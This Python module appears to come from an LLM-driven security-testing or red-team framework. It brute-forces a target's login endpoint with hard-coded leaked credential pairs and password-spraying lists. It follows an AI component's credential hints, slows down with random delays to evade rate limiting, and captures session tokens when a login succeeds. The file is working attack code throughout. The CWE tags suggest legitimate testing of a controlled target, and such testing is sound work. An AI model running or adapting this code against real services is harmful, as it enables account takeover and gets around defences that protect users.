"""
bruteforce.py — Credential stuffing, spraying, and login-oriented brute force.

Uses httpx against POST /target/login. Honors optional LLMDecision for endpoint
and credential hints; falls back to leaked-pair and spray lists from config.
"""

from __future__ import annotations

import random
import time
from typing import Any, Dict, Optional

import httpx

from backend.config import TARGET_BASE_URL
from backend.state import AttackEvent, LLMDecision, SystemState

from . import exploit_helpers as eh

_LEAKED_CREDENTIALS = [
    ("admin", "admin123"),
    ("admin", "admin"),
    ("guest", "guest"),
    ("user", "user2024"),
    ("alice", "alice2024"),
    ("bob", "bob2024"),
    ("root", "toor"),
    ("test", "test123"),
]

_COMMON_PASSWORDS = [
    "password", "123456", "admin", "letmein", "Password1",
    "qwerty", "welcome", "monkey", "1234567890", "password123",
    "admin123", "guest", "test", "user", "login", "pass",
    "secret", "root",
]

_COMMON_USERNAMES = [
    "admin", "administrator", "user", "test", "guest", "root",
    "john", "alice", "bob", "service", "api", "operator",
]

_CLIENT_TIMEOUT = httpx.Timeout(12.0)


def _recent_rate_limits(state: SystemState, n: int = 3) -> bool:
    """Returns True if the last n memory steps were login rate_limited — triggers slow mode."""
    mem = state.get("short_term_memory") or []
    tail = mem[-n:]
    if len(tail) < n:
        return False
    for m in tail:
        atk = (m or {}).get("attack") or {}
        if atk.get("type") != "bruteforce" or atk.get("result") != "rate_limited":
            return False
    return True


def _parse_llm_creds(decision: LLMDecision) -> tuple[Optional[str], Optional[str], str]:
    """Extracts username/password and login path from LLMDecision.payload."""
    payload = decision.get("payload") or {}
    user = payload.get("username") or payload.get("user")
    pw = payload.get("password")
    path = decision.get("target_endpoint") or "/login"
    if not path.startswith("/"):
        path = "/" + path
    return user, pw, path


def run(
    state: SystemState,
    llm_decision: Optional[LLMDecision] = None,
    slow_mode: bool = False,
) -> AttackEvent:
    """
    Attempts credential stuffing then spraying. Respects LLM-chosen endpoint and cred hints.

    Phases: (0) optional single attempt from llm_decision → (1) leaked pairs →
    (2) spray common passwords across common usernames. Classifies HTTP outcomes.
    """
    url_base = TARGET_BASE_URL.rstrip("/")
    slow_mode = slow_mode or _recent_rate_limits(state)

    # LLM-specified attempt first (if any usable fields)
    if llm_decision:
        u_hint, p_hint, path = _parse_llm_creds(llm_decision)
        login_url = f"{url_base}{path}" if path.startswith("/") else f"{url_base}/login"
        if u_hint and p_hint:
            if slow_mode:
                time.sleep(random.uniform(1.0, 3.0))
            ev = _try_login(login_url, u_hint, p_hint)
            if ev:
                return ev

    # Phase 1 — leaked credentials (deterministic order)
    login_url = f"{url_base}/login"
    for username, password in _LEAKED_CREDENTIALS:
        if slow_mode:
            time.sleep(random.uniform(1.0, 5.0))
        ev = _try_login(login_url, username, password)
        if ev:
            return ev

    # Phase 2 — password spray
    for password in _COMMON_PASSWORDS[:8]:
        for username in _COMMON_USERNAMES[:6]:
            if slow_mode:
                time.sleep(random.uniform(0.5, 2.0))
            ev = _try_login(login_url, username, password)
            if ev:
                return ev

    # All failed — still emit one representative event
    return AttackEvent(
        type="bruteforce",
        target="/login",
        payload="exhausted:leaked+spray",
        result="failed",
        evidence="HTTP 401 on final spray attempt (no valid pair found this step)",
        cwe="CWE-307",
        severity="medium",
        timestamp=time.time(),
    )


def _try_login(url: str, username: str, password: str) -> Optional[AttackEvent]:
    """POST JSON login; returns AttackEvent on terminal outcome, None to try next pair."""
    try:
        with httpx.Client(timeout=_CLIENT_TIMEOUT) as client:
            r = client.post(url, json={"username": username, "password": password})
    except Exception as e:
        return AttackEvent(
            type="bruteforce",
            target="/login",
            payload=f"{username}:{password}",
            result="failed",
            evidence=f"request error: {e!s}"[:500],
            cwe="CWE-307",
            severity="medium",
            timestamp=time.time(),
        )

    body = r.text[:400]
    if r.status_code == 429:
        return AttackEvent(
            type="bruteforce",
            target="/login",
            payload=f"{username}:{password}",
            result="rate_limited",
            evidence=f"HTTP 429 {body}",
            cwe="CWE-307",
            severity="medium",
            timestamp=time.time(),
        )
    if r.status_code == 200:
        token = eh.extract_token_from_response_json(r)
        extra = f" token={token[:16]}…" if token else ""
        return AttackEvent(
            type="bruteforce",
            target="/login",
            payload=f"{username}:{password}",
            result="success",
            evidence=f"HTTP 200 login ok{extra} body={body}",
            cwe="CWE-521",
            severity="high",
            timestamp=time.time(),
        )
    if r.status_code in (401, 403):
        return None  # try next credential

    return AttackEvent(
        type="bruteforce",
        target="/login",
        payload=f"{username}:{password}",
        result="failed",
        evidence=f"HTTP {r.status_code} {body}",
        cwe="CWE-307",
        severity="medium",
        timestamp=time.time(),
    )
